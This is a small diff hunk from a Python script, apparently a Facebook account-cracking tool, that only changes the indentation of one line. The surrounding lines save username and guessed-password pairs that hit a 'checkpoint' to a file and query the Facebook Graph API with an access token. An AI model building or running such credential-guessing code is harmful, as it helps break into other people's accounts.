@@ -2945,7 +2945,7 @@ def pilih_isi():
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
-cekpoint.append(user+pass6)
+                                                                                                                        cekpoint.append(user+pass6)
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
